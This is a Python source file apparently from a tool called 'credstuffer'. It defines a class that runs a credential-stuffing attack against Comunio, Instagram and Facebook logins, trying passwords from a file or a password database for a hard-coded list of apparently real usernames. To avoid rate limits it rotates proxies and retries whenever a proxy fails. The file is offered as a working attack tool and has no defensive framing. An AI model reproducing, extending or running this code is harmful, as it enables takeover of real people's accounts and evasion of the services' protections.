import logging
import threading
from credstuffer import UserAccount
from credstuffer.logins import Comunio, Instagram, Facebook
from credstuffer.proxy import Proxy
from credstuffer.dbhandler import DBHandler
from credstuffer.exceptions import ProxyMaxRequestError, ProxyBadConnectionError

usernames = [
    "shagattack",
    #"Gandi",
    #"Alki 90",
    #"seitzfabi",
    #"Cologne881",
    #"Dömers123",
    #"Mes35904",
    #"alexvögerl",
    #"seitzdani",
    #"Michl85",
    "bierschi"
]


class Stuffing:
    """ class Stuffing to execute the credential stuffing algorithm

    USAGE:
            stuffing = Stuffing()

    """
    def __init__(self, account, filepath=None, **dbparams):
        self.logger = logging.getLogger('credstuffer')
        self.logger.info('create class Stuffing')

        # init base class
        #super().__init__(**dbparams)

        self.dbparams = dbparams
        self.account = account

        self.account.set_usernames(usernames=["Gandi", "Alki 90", "seitzfabi", "Cologne881", "Dömers123", "Mes35904", "alexvögerl", "seitzdani", "Michl85", "bierschi"])
        #self.comunio.set_usernames(usernames=["Gandi", "Alki 90"])

        self.proxy = Proxy(timeout_ms=50)
        self.http_str = 'http://'
        self.https_str = 'https://'

        self.filepath = filepath

    def get_proxy_dict(self):
        """

        :return:
        """
        proxy = self.proxy.get()
        http_proxy = self.http_str + proxy
        #https_proxy = self.https_str + proxy
        return {'http': http_proxy}

    def account_proxy(self, account):
        """ sets a proxy for the given account

        :param account: account instance
        """
        try:
            proxy = self.get_proxy_dict()
            if account.set_proxy(proxy=proxy):
                return
            else:
                return self.account_proxy(account=account)
        except ProxyBadConnectionError as e:
            return self.account_proxy(account)

    def account_login(self, account, password):
        """ executes the account login with given password

        """
        try:
            return account.login(password)
        except (ProxyMaxRequestError, ProxyBadConnectionError, ProxyBadConnectionError) as e:
            self.account_proxy(account=account)
            return self.account_login(account=account, password=password)

    def run(self):
        """

        :return:
        """
        threads = []
        # handle user accounts
        if isinstance(self.account, UserAccount):
            thread = threading.Thread(target=self.user_account_worker, args=(self.account,))
            threads.append(thread)
            thread.start()

        # handle email accounts
        else:
            pass

        for thread in threads:
            thread.join()

    def user_account_worker(self, account):
        """

        :param account:
        :param username:
        :return:
        """

        # set proxy
        self.account_proxy(account=account)

        if self.filepath is not None:
            # get passwords from file
            with open(self.filepath, 'r', encoding='utf-8', errors='ignore') as f:
                for line in f:
                    password = line.strip('\n')
                    # execute login
                    self.account_login(account=account, password=password)

        else:
            # init database
            dbhandler = DBHandler(**self.dbparams)
            schema_list = dbhandler.schema_list

            # iterate over schemas
            for c_schema in schema_list:
                if c_schema == 'symbols':
                    self.logger.info("fetch data from {}.{}".format(c_schema, c_schema))
                    passwords_data = dbhandler.fetch_data(schema=c_schema, table=c_schema)
                    for entry in passwords_data:
                        if entry[0]:
                            password = entry[0]
                            # execute login
                            self.account_login(account=account, password=password)
                else:
                    # iterate over tables
                    for c_table in schema_list:
                        self.logger.info("fetch data from {}.{}".format(c_schema, c_table))
                        passwords_data = dbhandler.fetch_data(schema=c_schema, table=c_table)
                        for entry in passwords_data:
                            if entry[0]:
                                password = entry[0]
                                # execute login
                                self.account_login(account=account, password=password)
                    break

